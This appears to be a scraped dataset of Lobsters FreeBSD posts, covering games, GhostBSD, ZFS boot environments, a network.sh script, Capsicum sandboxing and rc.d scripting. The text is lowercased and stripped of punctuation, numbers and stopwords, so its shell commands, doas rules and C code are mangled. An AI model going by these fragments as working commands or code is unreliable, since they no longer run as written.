gb ram stick provide battery time gb memory using two gb ram module also performance drawback single ram module able use dual channel technology limit ram speed laptop even ram slot like thinkpad example without losing anything use two gb ram stick instead four gb ram stick longer battery life sometimes possible swap dvd drive internal secondary battery example laptop dell latitude thinkpad thinkpad sometimes vendor offer entire slice battery stick bottom laptop like slice battery thinkpad laptop generation thinkpad laptop hope information help squeeze battery time least save power freebsd update graphic card power saving graphicsdrmkmod package installed probably use latest kernel module set maximum power management integrated intel graphic card put bootloaderconf file intel drm graphicsdrmkmod package new skip unnecessary mode set boot time use semaphore inter ring sync enable power saving render cstate enable power saving display cstates enable frame buffer compression power saving past setting used present anymore intel drm graphicsdrmkmod package old update amd cpu temperature coretemp kernel module used intel cpu amdtemp kernel module provide additional temperature information amd cpu update suspendresume tip biggest enemy supendresume subsystem bug biosuefi firmware sometimes disabling bluetooth help option lenovo thinkpad example lenovo thinkpad disabling tpm trusted platform module eof like like loading related
287,Lobsters,freebsd,FreeBSD,Stardew Valley on FreeBSD,http://bitcannon.net/post/stardew-valley-on-freebsd/,stardew valley freebsd,year away mac o freebsd stardew valley recent progress running stardew valley openbsd mariusz zaborski stardew valley running freebsd prerequisite note freebsd port fnaify script fnaify stardew valley gog,year away mac o wrote switch freebsd desktop computer noted one downside losing stardew valley initially missed playing game stardew valley freebsd consuming hour time week prior freebsd install extra friction rebooting arch run game basically stopped playing entirely bad thing recent progress running stardew valley openbsd could look porting enough side project though fortunately mariusz zaborski oshogbo porting work play stardew valley game freebsd post describe step took get running stardew valley running freebsd prerequisite need following package installed note get audio work build openalsoft port pulseaudio support enabled default configuration also need freebsd port fnaify script cloned downloaded github git clone http githubcomoshogbofbsdfnaifygit fnaify assuming purchased stardew valley gog login visit game collection click stardew valley change system linux download game download finished extract unzip note file name may differ update game cd downloads mkdir stardewvalley cd stardewvalley unzip run fnaify check dependency installed fix path system library create new launcher script change path fnaify match cloneddownloaded cd datanoarchgame sourcefbsdfnaifyfnaify see output similar checking installed library result configuration testing success adjusting config file bsd replacing launcher script bsd variant able start game running stardewvalley script suggests able start game running stardewvalley happy farming
288,Lobsters,freebsd,FreeBSD,capsicumizer: sandboxing (GUI) apps on FreeBSD with external profiles,https://github.com/myfreeweb/capsicumizer,capsicumizer sandboxing gui apps freebsd external profile,super capsicumizer capsicum oblivious patch libpreopen requirement meson libucl libpreopen usage contributing contributor code conduct list contributor available github license unlicenseorg,super capsicumizer capsicumizer sandbox launcher imposes capsicum capability mode onto unsuspecting program allowing sysadmin style oblivious sandboxing ie source code modification restriction added externally write apparmoresque profile capsicumizer take care sandboxing application capsicumizer capable launching gui application like gedit wayland gtk required patch note application use syscalls directly instead going libc namely anything compiled golang official compiler wo nt able actually access file allowed path rely ldpreloading library libpreopen override libc function like open make use openat style function preopened directory descriptor requirement recent version freebsd meson build system libucl pkg libpreopen linked fork least pkg someday usage capsicumizer profile written ucl syntax pretty common freebsd used directly runnable script usrbinenv capsicumizer run usrlocalbingedit accesspath home usrlocal vardbfontconfig tmp librarypath lib usrlib usrlocallib usrlocallibgvfs usrlocallibgiomodules usrlocallibgedit gedit need extra preloads example ldpreload environment variable program argument etc exposed ucl variable contributing participating project agree follow contributor code conduct list contributor available github license free unencumbered software released public domain information please refer unlicense file unlicenseorg
290,Lobsters,freebsd,FreeBSD,FreeBSD for Thanksgiving,https://bwidawsk.net/blog/index.php/2018/11/freebsd-for-thanksgiving/,freebsd thanksgiving,earlier year handsome guy right patch gave talk meetbsd started working full src committer,working freebsd intel almost month world programmer considered old dog month learning new trick luckily found remarkably inclusive receptive community whose patience seems plentiful get ready take time holiday move retrospective time year thought beat rush bit update progress earlier year decided move architect linux graphic driver nebulous role freebsd enabling excited also uncertain making right decision earlier half decided general work power management highly important began working attended bsdcam handsome guy right led session power management honored able lead kind effort earlier quarter put first round patch review implementing suspendtoidle rougher patch handle support suspendingtoidle gave talk meetbsd team work earlier month noticed freebsd implementation intel speed shift hwpstates started working earlier week promoted lowly mentee committer full src committer earlier today decided relegate linux laptop role backup machine writing dell running freebsd vandamme freebsd hwp dirty mon nov pst bwidawsk vandamme month later feel lot le uncertain making right decision fact think opportunity would great thankful thanksgiving life career plan thing want get done looking forward thankful next year
292,Lobsters,freebsd,FreeBSD,GhostBSD 18.10 Now Available,https://www.ghostbsd.org/18.10_release_announcement,ghostbsd available,changed since issue got fixed ixsystems trueos download http wwwghostbsdorgdownload upgrade rc feedback http tmeghostbsd ghostbsd ghostbsd forum donate become patron donate ghostbsd patron,ghostbsd first official release ghostbsd trueos hood official desktop mate however future might community release community released yet changed since ghostbsd built trueos instead freebsd openrc ghostbsd main init system libressl default ssl ghostbsd base system upgraded next release via trueos package base removed grub iso favor new freebsd hybrid loader networkmgr support option manage multiple network card connection unionfs removed live session live system rewritten fix many issue ghostbsd boot directly mate session ghostbsd support zfs default freebsd port package incompatible ghostbsd ghostbsd us trueos port build packagesdrmnextkmod added newer amd intel supportibvainteldriver libvavdpaudriver added support accelerated video driver intel added default support latest nvidia cardxconfig created add generated default xorgconf issue got fixed virtualbox firefox scroll issue slim login failing live cd bug run octopus missing libgksu error bug libreoffice nt start missing bug libarchive missing dependency thanks ixsystems trueos joe maloney kris moore ken moore martin wilke neville goddard vester vic thacker douglas joachim alex lyakhov yetkin degirmenci damian szidiropulosz many contributed one way another making releasewhere download image checksum hybrid iso dvd usb torrent available http wwwghostbsdorgdownload writing iso usb stick bsd dd linux dd ofdevsdc mac dd upgrade rc sudo pkg update fsudo pkg upgradefeedback anything help get involved maybe want discus experience ask u question please contact u telegram http tmeghostbsd irc freenode ghostbsd ghostbsd forum donate become patronwe depend get ghostbsd better system please donate even better become patron donate ghostbsd become ghostbsd patron
293,Lobsters,freebsd,FreeBSD,Games on FreeBSD,https://oshogbo.vexillium.org/blog/58/,game freebsd,polish bsd user group mulander xna based game opensource game wine summary reddit playonbsdcom mulander update change upstreamed official repo thomas frohwein,programmer like work ok programers like work answer simple play good game recently polish bsd user group meetup mulander telling u play game openbsd today let discus look freebsd world using server operating system xna based game one way playing natively play indie game use xna xna framework microsoft us net creating game fortunately bsd world mono open source implementation microsoft net framework use run game also fna framework reimplementation xna allows run game linux thomas frohwein openbsd prepared script fnaify fnaify translate dependency used fna game openbsd dependency decided port script freebsd script using binsh case openbsd korn shell openbsd shopenbsd echo shellbinkshopenbsd binksh binksh binsh korn shell two main feature used script supported bourne shell used fnaify array iterating arrayname index size arrayname arrayname accessing element ignoredarray size array set setting multiple value array new test command construction could use another shell like bash accomplish task decided rewrite whole script bourne shell make simpler port across operating system well another problem difference sed openbsd freebsd simplified command work platform also reduced code size script official version support freebsd find tested stardew valley see demo nt test many game see reason work game tested openbsd guy example cryptark rouge legacy apotheon escape goat bastion crosscode atom zombie smasher opensource game freebsd openbsd also find popular game open sourced example spend lot time playing quake arena freebsd machine simply install using pkg pkg install move file skin map directory copy quake past also played urbanterror fully open source shooter based quake arena engine also easy install port pkg install iourbanterror port tree game directory find directory many fully implemented game test many game category find interesting title like openxcom opensource reimplementation original xcom openjazz free reimplementation jazz jackrabbit tm game engine corsixth open source reimplementation theme hospital openra red alert open source reimplementation rollercoaster tycoon openmw open source engine reimplementation game morrowind title simply installed package case think freebsd difference openbsd wine one big advantage freebsd openbsd freebsd support wine wine allows run window application operating system including mac freebsd user simply fetch wine package pkg install run window game need wine game window built maybe changed play much day case run freebsdcurrent needed build wine port nice also unpleasant whole stepbystep building process wine port found loved freebsd easily configure additional interpreter executables binmiscctl add interpreter magic mask xffxffxffxffxffxffxffxffxffxffxffxffxffxffxffxffxffxffxffxff size setenabled hex magic value see mz letter signature window executables theory wine allows play many many game see wine database whole list unfortunately running game wine challenging different game different issue thinking buying game running freebsd would recommend first checking game wine database known error running linux feel free try freebsd test many game freebsd game tested septerra core legacy creator old crpg kid spent many hour playing turn bought gogcom time ago gog released linux version game mean script allow run linux using wine first problem script shebang set binbash big problem change still people understand everybody bash installed bin script gogcom using linux library attached game file elf lsb executable intel version sysv dynamically linked interpreter gnulinux buildid debuginfo stripped freebsd try run linux binary compatibility layer called linuxulator spent couple minute playing script started run machine tried run game debug starting septerra core debug curernt variable debug path sbin bin usrsbin usrbin usrlocalsbin usrlocalbin homeoshogbobin usrlocalbin homeoshogbobindebug pwd homeoshogbogog gamessepterra core legacy creatorgamedebug startdir usrhomeoshogbogog gamessepterra core legacy creatorgamedebug gamedir usrhomeoshogbogog gamessepterra core legacy creatorgamegamedebug winebindir usrhomeoshogbogog gamessepterra core legacy creatorgamewinebindebug wineconfig usrhomeoshogbogog gamessepterra core legacy creatorgamewineprefixconfigdebug wine binary shoult usrhomeoshogbogog gamessepterra core legacy done debug starting game debug adding winebindir path path usrhomeoshogbogog gamessepterra core legacy creatorgamewinebin sbin bin usrsbin usrbin usrlocalsbin usrlocalbin homeoshogbobin usrlocalbin homeoshogbobindebug adding winelibdir ldlibrarypath ldlibrarypath usrhomeoshogbogog gamessepterra core legacy creatorgamewinelib usrlocallibdebug entering game directory using cd usrhomeoshogbogog gamessepterra core legacy creatorgamegamedebug calling wine septerraexe wine failed initialize open shared object file file directory see wine trying look ntdlldll obviously looked inside binary discovered multiple library hardcoded nt really mean anything maybe one magic environment allows run game find gave path gog allows download window game two way one using fancy installer work trying run old window second way offline backup allows download normal game installer downloaded window version game tried run wine everything looked pretty good intro played sound working clicked new game button game crashed error mentioned using uninitialized memory devastated couple minute disconnecting additional monitor leaving primary use monitor pc clicking new game button main screen option menu game seems work summary see many title available bsds thanks fna fnaify openbsd freebsd work indie game use xna framework many interesting game implemented using framework open source big server machine many reimplementations popular game like theme hospital rollercoaster tycoon biggest market still enabled wine although creates lot problem run game also openbsd user option available please also note discus emulator besides wine openbsd freebsd many gameboy snes neogeo game console said openbsd big gaming community multiple place want information hesitate visit reddit irc openbsdgaming freenode important place playonbsdcom service still construction list popular game available bsd operating system would like thank mulander showing big gaming market bsds tested open source game spent couple hour fighting wine tested freebsd version fnaify please share experience comment section update change fnaify upstreamed official repo thomas frohwein
294,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 2.1 - Install FreeBSD 12,https://vermaden.wordpress.com/2018/11/20/freebsd-desktop-part-2-1-install-freebsd-12/,freebsd desktop part install freebsd,freebsd desktop part install zfs boot environment reloaded nluug freebsd desktop global page freebsd availability freebsd release note zfs rename u zrootusr zrootrootdefaultusr zfs rename u zrootvar zrootrootdefaultvar freebsd iso like,article updaterewrite already published freebsd desktop part install upcoming introduction freebsd version new possibility arise come installation already talkedshowed method zfs boot environment reloaded nluug presentation make available obvious part freebsd desktop series write dedicated article entry may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content freebsd possible install freebsd geli encrypted root zfs pool without additional partition filesystems longer separate ufs zfs boot pool boot filesystem needed even appealing setup supported uefi bios also refereed legacy csm system setup also compatible new bectl utility old proven beadm tool also nice make setup need choose auto zfs option bsdinstall hand advice using gpt biosuefi support system type running bios system move disk system boot uefi also work box freebsd currently stage use one example setup expected arise christmas significant problem bug found road edition record freebsd availability information page aggregated freebsd release note upcoming new major freebsd version yet completeready show one install process work uefi bios system crucial option gpt biosuefi select also default one option need select yes encryption part also select swap size may well use swap enter mean swap partition created may well create zfs zvol partition swap zfs pool later create file like swap enable swap matter swap option choose system swap low memory neither method better worse one last thing default freebsd matter zfs datasetfilesystem layout showed zfs boot environmentszfs boot environment reloaded presentation without text comment talked live default var usr filesystems part boot environment protected snapshoted beadm create newbe process bectl also appears var usr separate process type zfs list commend shown slide check canmount parameter zfs datasets become obvious usr var empty datasets mounted also confirmation df tool asked freebsd developer reason construct mountpoint inheritance purpose example zrootusr mountpoint set usr create zrootusrlocal dataset automatically get usrlocal mountpoint parameter inheritance first sight may misleading also got caught make sense think filesystems included boot environment protection usrhome usrports usrsrc varaudit varcrash varlog varmail vartmp case needed protect boot environment protection want also protect type two comment move usr var datasetsfilesystems boot environment poolrootdataset work running system without need reboot make sure use u flag zfs rename u zrootusr zrootrootdefaultusr zfs rename u zrootvar zrootrootdefaultvar grab freebsd iso install best possible way date probably want get version suitable amd intel system eof like like loading related
295,Lobsters,freebsd,FreeBSD,FreeBSD Network Management with network.sh,https://vermaden.wordpress.com/2018/03/24/freebsd-network-management-with-network-sh-script/,freebsd network management networksh,networkmgr http githubcomghostbsdnetworkmgr netmgmtnetworkmgr networkmgr networksh networksh networksh help networksh pw groupmod network networksh doas pkg install doas cat usrlocaletcdoasconf eof permit nopass network root cmd bincat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd dhclient permit nopass network root cmd ifconfig permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args ppp permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd umount permit nopass network root cmd wpasupplicant eof pw groupmod network mv networkshkey networksh mv networkshouitxtkey networkshouitxt networksh stop networksh wwan start networksh dns onic http http githubcomakpoffnetctl update connect openunsecured wifi network nluug autumn conference grep c keymgmtnone etcwpasupplicantconf networksh networksh update openbox integration freebsd desktop part configuration openbox update updated status page http githubcomvermadenscriptsblobmasternetworksh like,use one connection freebsd best practice put whole configuration etcrcconf file example typical server redundant connection would look like one clonedinterfaces lro tso vlanhwtag mtu lro tso vlanhwtag mtu laggproto lacp laggport laggport inet must use one connection often switch sometimes several time day using main freebsd config file convenient way operation laptop often switch wwan usually connection wlan typical wifi connection even lan cable course use graphical networkmgr ghostbsd project described python network manager freebsd ghostbsd trueos dragonflybsd networkmgr support netif openrc network citing project site http githubcomghostbsdnetworkmgr also available freebsd port package netmgmtnetworkmgr miss networkmgr wwan connection management dns management optional random mac generation network share unmount disconnect network solution networksh still need edit etcwpasupplicantconf etcppppppconf file hand also perfect solution typical desktop usage edit file every day use wwan wlan lan connection laptop depends location wrote script automate connection management deterministic convenient way least also set dns safenologging provider even random safe dns generate legitimate mac address lan wlan needed even real oui first three octet also additional networkshouitxt file inside networksh script help message networksh help usage networksh type option type lan wlan wwan dns option start start ssidprofile stop example example networksh lan start networksh lan restart networksh wlan start networksh wlan start homenetworkssid networksh wwan example networksh dns onic networksh dns udns networksh dns random networksh doas networksh sudo run networksh appreciate argument start network connection display screen command would run achieve also make use sudo doas assuming network group add network group type command pw groupmod network networksh doas command print right need work without root privilege networksh sudo command example networksh doas pw groupmod network yourusername cat usrlocaletcdoasconf permit nopass network root cmd bincat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd dhclient permit nopass network root cmd ifconfig permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args ppp permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd umount permit nopass network root cmd wpasupplicant networksh script edit usrlocaletcdoasconf usrlocaletcsudoers file put line example doas setup networksh script pkg install doas cat usrlocaletcdoasconf eof permit nopass network root cmd bincat args etcppppppconf permit nopass network root cmd etcrcdnetif args onerestart permit nopass network root cmd dhclient permit nopass network root cmd ifconfig permit nopass network root cmd killall args dhclient permit nopass network root cmd killall args ppp permit nopass network root cmd killall args wpasupplicant permit nopass network root cmd ppp permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd tee args etcresolvconf permit nopass network root cmd umount permit nopass network root cmd wpasupplicant eof pw groupmod network networksh script upon disconnect would also forcefully unmount network share idea one connection type time type networksh lan start type networksh wlan start reset entire freebsd network stack default setting etcrcconf file connect wifi clean network environment could say use different method connecting various network network setting etcrcconf file may prefer example dhcp local lan enabled convenient setting beginning networksh script modify need hardware setting wwanprofilewwan name basename netfs nfs smbfs fusefssshfs specify netfs filesystems want forcefully unmount network stop set different physical wlan adapter wlanph option like atheros chip similar lan interface also default intel based network card driver lanif option want disable random mac address lan enable generation random mac address wifi network option also decide want use sudo sudo option doas doas option networksh script optional networkshouitxt oui data downloading please rename accordingly wordpress limitation mv networkshkey networksh mv networkshouitxtkey networkshouitxt example network connection stop networksh stop doas killall wpasupplicant doas killall ppp doas killall dhclient doas ifconfig destroy doas ifconfig echo doas tee etcresolvconf doas etcrcdnetif onerestart example wwan network connection start networksh wwan start doas killall wpasupplicant doas killall ppp doas killall dhclient doas ifconfig destroy doas ifconfig echo doas tee etcresolvconf doas etcrcdnetif onerestart doas ppp ddial wwan example od dns change networksh dns onic echo doas tee etcresolvconf echo nameserver doas tee etcresolvconf echo nameserver doas tee etcresolvconf problem networksh script let know try fix asap openbsd freebsd vincent delft wrote nmctl network manager control tool openbsd available http ther also another openbsd project aaron poffenberger network management netctl cli networklocation manager openbsd available http githubcomakpoffnetctl update connect openunsecured wifi network recently attending salt workshop nluug autumn conference utrecht nederland wanted connect open unsecured wifi network called utrecht hotel phone course attached instantly hand freebsd able connect turn want enable wpasupplicant connect open unsecured network separate etcwpasupplicantconf option needed option open unsecured network need create rule openunsecured network line etcwpasupplicantconf file grep c keymgmtnone etcwpasupplicantconf network keymgmtnone also modified networksh contain information example section also made little fix always reset previously setforced ssid earlier usage ifconfig ssid networksh even pleasant use update openbox integration freebsd desktop series article described setup openbox window manager freebsd desktop part configuration openbox available example integration networksh script openbox window manager code used configopenboxmenuxml file update updated status page jest added reworked status page networksh script already updated github script repository http githubcomvermadenscriptsblobmasternetworksh look eof like like loading related
296,Lobsters,freebsd,FreeBSD,FreeBSD 12 Release Engineering Branch Created,https://svnweb.freebsd.org/base/releng/12.0/,freebsd release engineering branch created,svn mergeinfo,svn mergeinfo
297,Lobsters,freebsd,FreeBSD,ZFS Boot Environments Reloaded,https://vermaden.wordpress.com/2018/11/15/zfs-boot-environments-reloaded-at-nluug-autumn-conference-2018/,zfs boot environment reloaded,zfs boot environment reloaded nluug najaarsconferentie http isgdbectl like,today honored give zfs boot environment reloaded talk nluug najaarsconferentie nluug autumn conference dunno long conference page available find conference page program program lot interesting talk really liked salt workshop end day wanted also attend ansible presentation morning spend almost hour car driving central poland netherlands really needed sleep invited download pdf slide http isgdbectl available finished talk video talk yet available update post besides obvious thing zfs boot environment also talked upcoming freebsd improvement area currently freebsd planned released around christmas later year stage currently also abstract added conference page presentation abstract long sysadmins need maintain change update operating system always need protect problem may occur operation various solution used starting simple backuprestore procedure copying content system filesystems spare disk snapshot clone recently none solution transparent enough bulletproof enough provide complete consistent protection failure change update process one holy grail zfs boot environment solution protects entire system even additional data needed almost change update process zfs boot environment matured solarisillumos system freebsd unix system started copy principle provide similar solution snapper btrfs suse boot environment manager dragonfly bsd hammer filesystem presentation aim walk history solution focus practical zfs boot environment solution example hope enjoy eof like like loading related
298,Lobsters,freebsd,FreeBSD,Linux and FreeBSD networking,https://medium.com/@matteocroce/linux-and-freebsd-networking-cbadcdb15ddd,linux freebsd networking,test setup dell poweredge script spectre meltdown dpdk guest o setup freebsd wiki,test setupto avoid setup cable interface bare metal system decided get single powerful server partition four vms two running fedora two running freebsd hardware dell poweredge hypervysor kvm fedora latest kernelthe server partitioned task host o interfere guest vcpu physical cpu removed scheduler rcu callback timer system booted nosmtforce avoid using ht siblingsboth gbit card first numa node decided completely disable second numa node putting cpu memory second node kernel command line script run bootintel turbo boost pstates known skew benchmark disabled kernel command line writing withwrmsrpx appropriate register cpuspectre meltdown mitigation disabled via kernel command lineat end kernel command line ptioff intelpstatedisable nosmtforce specstorebypassdisableoff interconnected via dpdk switch handle milions packet per second single core two core dedicated dpdkwhile storage relevant purpose lvm logical group created every vm instead using file even worse sparse imagesguest o setupeach vcpu pinned isolated physical core ram backed gb hugepages virtio driver peripheral used cpu gb ram given vmthe freebsd wiki suggests disable entropy harvesting benchmark adding harvestmask etcrcconf idea make sense even find way linuxlinux fresh fedora install vanilla kernel recompiled fedora config make possible unload iptablesfilter root uname alinux smp tue oct cest gnulinuxroot grep model name proccpuinfomodel name intel core processor skylake model name intel core processor skylake root grep e mem totalavailable procmeminfomemtotal kbmemavailable kbroot lspci host bridge intel corporation pmc natoma rev isa bridge intel corporation isa natomatriton ii ide interface intel corporation ide natomatriton ii bridge intel corporation acpi rev ethernet controller red hat inc virtio network device scsi storage controller red hat inc virtio block device scsi storage controller red hat inc virtio block device unclassified device red hat inc virtio rng freebsd root uname afreebsd freebsd thu sep utc root usrobjusrsrcsysgeneric sysctl hwmodel hwncpu hwphysmem hwusermem hwrealmemhwmodel intel core processor skylake hwncpu lspci host bridge intel corporation pmc natoma rev isa bridge intel corporation isa natomatriton ii ide interface intel corporation ide natomatriton ii bridge intel corporation acpi rev ethernet controller red hat inc virtio network device communication controller red hat inc virtio console scsi storage controller red hat inc virtio block device scsi storage controller red hat inc virtio block device unclassified device red hat inc virtio rng spectre meltdown disabled guest o root sysdevicessystemcpuvulnerabilities grep meltdown vulnerablespecstorebypass mitigation user pointer vulnerableroot sysctl vmpmappti hwibrsdisable hwibrsactivevmpmappti
299,Lobsters,freebsd,FreeBSD,Capsicum,https://oshogbo.vexillium.org/blog/57/,capsicum,,spent couple year evangelizing capsicum wrote many article natural would also like update blog progress capsicum project freebsd free time said feel blog completed without introduction capsicum post fill gap next week month extend topic discus different part capsicum without introduction let jump topicimagine application anything data literally anything imagine application get private photo send internet external server unixlike operating system almost application exploitable bug grep somebody would able exploitable bug cat somebody would able application access user data talking ambient authority could stuff another way application could capability use thing really need use grep would readonly right file parse create network connection send signal different process capability world capsicum implementsthe first part capsicum tight sandbox obtained using capenter syscall tight sandbox mean access global namespace like file path process id pid although program use capability accomplish task turn descriptor match ideally idea capability clone dup send unix domain socket remove closing etc beyond set function work descriptor provides new one like openat take descriptor directory return new one given file name using syscall single descriptor give capability file directory list allowed syscall kept syskerncapabilitesconf file examine notice syscalls require descriptor changing global state machine like umask change setting current processcapsicum additionally implement capability right simply mean limit descriptor even using caprightslimit syscall set particular right particular descriptor example say descriptor readonly others appendonly currently right detail please refer right man pagemany unixlike application divided two part first part socalled initialization phase prepare program parse option etc second part main phase complicated calculation parsing etc simplest scenario divide phase sandboxed application initialization phase open file need create socket etc entering capability mode complicated phase main phase sandbox complicated algorithm exploitable bug attacker gain access data process already go one step limit descriptor readonly writeonly limit damage done attacker one program sandboxed using method bspatch allan jude sandboxed commit let look two part first one moved open initialization phase open patch file f fopen argv rb null err fopen argv open patch file control block cpf fopen argv rb null err fopen argv open patch file diff block dpf fopen argv rb null err fopen argv open patch file extra block epf fopen argv rb null err fopen argv open oldfile oldfd open argv ordonly obinary err open argv open newfile newfd open argv ocreat otrunc owronly obinary err open argv close patch file reopen via right place fclose f err fclose argv cpf fopen argv rb null err fopen argv fseeko cpf seekset err fseeko lld argv long long cpf null null errx dpf fopen argv rb null err fopen argv fseeko dpf bzctrllen seekset err fseeko lld argv long long bzctrllen dpf null null errx epf fopen argv rb null err fopen argv fseeko epf bzctrllen bzdatalen seekset err fseeko lld argv long long bzctrllen bzdatalen epf null null errx oldfd open argv ordonly obinary oldfd err argv oldsize lseek oldfd seekend old malloc null lseek oldfd seekset err fclose argv write new file newfd open argv ocreat otrunc owronly obinary newfd err argv write newfd new newsize newsize close newfd err argv sequence open simply enter capability mode needed sandbox also extend sandbox use capability right done part capenter failed sandbox fatal capabilitymode enabled errno enosys err failed enter security sandbox else capsicum available caprightsinit rightsro capread capfstat capseek caprightsinit rightswr capwrite caprightslimit fileno f rightsro caprightslimit fileno cpf rightsro caprightslimit fileno dpf rightsro caprightslimit fileno epf rightsro caprightslimit oldfd rightsro caprightslimit newfd rightswr err caprightslimit failed could restrict capability opened descriptor limited able read stat file seek file last descriptor opened writes really needed basic sandbox bspatch hardest part understanding code rather sandboxing post discussed basic idea behind capsicum one simplest way sandboxing application separating two phase initialization main phase sometimes approach separate program two phase enough need extended privilege separation compartmentalization let leave another blog post
300,Lobsters,freebsd,FreeBSD,Practical rc.d scripting in BSD,https://www.freebsd.org/doc/en/articles/rc-scripting/article.html#rcng-dummy,practical rcd scripting bsd,practical rcd scripting bsd original article luke mewburn respective manual page note tip note note note important configurable dummy script note note important note startup shutdown simple daemon note earlier startup shutdown advanced daemon note shown later note note note note note important note connecting script rcd framework porter handbook note note note giving flexibility rcd script important note original article luke mewburn,practical rcd scripting bsdcopyright freebsd projectfreebsd registered trademark freebsd foundationnetbsd registered trademark netbsd foundationmany designation used manufacturer seller distinguish product claimed trademark designation appear document freebsd project aware trademark claim designation followed symbollast modified wblockabstractbeginners may find difficult relate fact formal documentation bsd rcd framework practical task rcd scripting article consider typical case increasing complexity show rcd feature suited case discus work examination provide reference point study design efficient application rcdthe historical bsd monolithic startup script etcrc invoked init system boot time performed userland task required multiuser operation checking mounting file system setting network starting daemon precise list task every system admins needed customize exception etcrc modified true hacker liked itthe real problem monolithic approach provided control individual component started etcrc instance etcrc could restart single daemon system admin find daemon process hand kill wait actually exited browse etcrc flag finally type full command line start daemon task would become even difficult prone error service restart consisted one daemon demanded additional action word single script failed fulfil script make system admin life easierlater attempt split part etcrc sake starting important subsystem separately notorious example etcnetstart bring networking allow accessing network singleuser mode integrate well automatic startup process part code needed interleave action essentially unrelated networking etcnetstart mutated etcrcnetwork latter longer ordinary script comprised large tangled sh function called etcrc different stage system startup however startup task grew diverse sophisticated quasimodular approach became even drag monolithic etcrc beenwithout clean welldesigned framework startup script bend backwards satisfy need rapidly developing bsdbased operating system became obvious last step necessary way finegrained extensible rc system thus bsd rcd born acknowledged father luke mewburn netbsd community later imported freebsd name refers location system script individual service etcrcd soon learn component rcd system see individual script invokedthe basic idea behind bsd rcd fine modularity code reuse fine modularity mean basic service system daemon primitive startup task get sh script able start service stop reload check status particular action chosen commandline argument script etcrc script still drive system startup merely invokes smaller script one one start argument easy perform shutdown task well running set script stop argument done etcrcshutdown note closely follows unix way set small specialized tool fulfilling task well possible code reuse mean common operation implemented sh function collected etcrcsubr typical script line worth sh code finally important part rcd framework rcorder help etcrc run small script orderly respect dependency help etcrcshutdown proper order shutdown sequence opposite startupthe bsd rcd design described original article luke mewburn rcd component documented great detail respective manual page however might appear obvious rcd newbie tie numerous bit piece together order create wellstyled script particular task therefore article try different approach describe rcd show feature used number typical case note howto document aim giving readymade recipe showing easy entrance rcd realm neither article replacement relevant manual page hesitate refer formal complete documentation reading articlethere prerequisite understanding article first familiar sh scripting language order master rcd addition know system performs userland startup shutdown task described rc article focus freebsd branch rcd nevertheless may useful netbsd developer two branch bsd rcd share design also stay similar aspect visible script authorsa little consideration starting editor hurt order write welltempered rcd script system service able answer following question first service mandatory optional script serve single program eg daemon perform complex action service service depend vice versa example follow see important know answer questionsthe following script emits message time system boot binsh etcrcsubr name dummy startcmd name start stopcmd dummystart echo nothing started loadrcconfig name runrccommand thing note interpreted script begin magic shebang line line specifies interpreter program script due shebang line script invoked exactly like binary program provided execute bit set see chmod example system admin run script manually command line etcrcddummy startnote order properly managed rcd framework script need written sh language service port us binary control utility startup routine written another language install element usrsbin system usrlocalsbin port call sh script appropriate rcd directorytip would like learn detail rcd script must written sh language see etcrc invokes mean runrcscript study implementation runrcscript etcrcsubr etcrcsubr number sh function defined rcd script use function documented rcsubr theoretically possible write rcd script without ever using rcsubr function prove extremely handy make job order magnitude easier surprise everybody resort rcsubr rcd script going exceptionan rcd script must source etcrcsubr include using call rcsubr function sh opportunity learn function preferred style source etcrcsubr first allnote useful function related networking provided another include file etcnetworksubr mandatory variable name specifies name script required rcsubr rcd script must set name call rcsubr functionsnow right time choose unique name script use number place developing script start let u give name script file toonote current style rcd scripting enclose value assigned variable double quote keep mind style issue may always applicable safely omit quote around simple word without sh metacharacters certain case need single quote prevent interpretation value sh programmer able tell language syntax style convention use wisely main idea behind rcsubr rcd script provides handler method rcsubr invoke particular start stop argument rcd script handled way method sh expression stored variable named argumentcmd argument corresponds specified script command line see later rcsubr provides default method standard argumentsnote make code rcd uniform common use name wherever appropriate thus number line copied one script another keep mind rcsubr provides default method standard argument consequently must override standard method noop sh expression want nothing body sophisticated method implemented function good idea make function name meaningfulimportant strongly recommended add prefix name name function defined script never clash function rcsubr another common include file call rcsubr load rcconf variable script make use yet still recommended load rcconf rcconf variable controlling rcsubr usually last command rcd script invokes rcsubr machinery perform requested action using variable method script configurable dummy scriptnow let u add control dummy script may know rcd script controlled rcconf fortunately rcsubr hide complication u following script us rcconf via rcsubr see whether enabled first place fetch message show boot time two task fact independent one hand rcd script support enabling disabling service hand mandatory rcd script configuration variable thing script though binsh etcrcsubr namedummy rcvardummyenable startcmd name start stopcmd loadrcconfig name dummyenable dummymsg nothing started dummystart echo dummymsg runrccommand changed example variable rcvar specifies name onoff knob variable loadrcconfig invoked earlier script rcconf variable accessednote examining rcd script keep mind sh defers evaluation expression function latter called therefore error invoke loadrcconfig late runrccommand still access rcconf variable method function exported runrccommand method function called runrccommand invoked loadrcconfig warning emitted runrccommand rcvar set indicated knob variable unset rcd script base system add default setting knob etcdefaultsrcconf document rcconf otherwise script provide default setting knob canonical approach latter case shown examplenote make rcsubr act though knob set irrespective current setting prefixing argument script one force onestart forcestop keep mind though force dangerous effect touch upon one override onoff knob eg assume dummyenable following command run start method spite setting etcrcddummy onestart message shown boot time longer hardcoded script specified rcconf variable named dummymsg trivial example rcconf variable control rcd scriptimportant name rcconf variable used exclusively script must prefix name example dummymode dummystatefile onnote possible use shorter name internally eg msg adding unique prefix name global name introduced script save u possible collision rcsubr namespaceas rule rcd script base system need provide default rcconf variable default set etcdefaultsrcconf instead hand rcd script port provide default shown example use dummymsg actually control script ie emit variable message use shell function overkill since run single command equally valid alternative startcmd echo dummymsg startup shutdown simple daemonwe said earlier rcsubr could provide default method obviously default general suited common case starting shutting simple daemon program let u assume need write rcd script daemon called mumbled binsh etcrcsubr namemumbled rcvarmumbledenable command usrsbin name loadrcconfig name runrccommand pleasingly simple nt let u examine little script new thing note follows command variable meaningful rcsubr set rcsubr act according 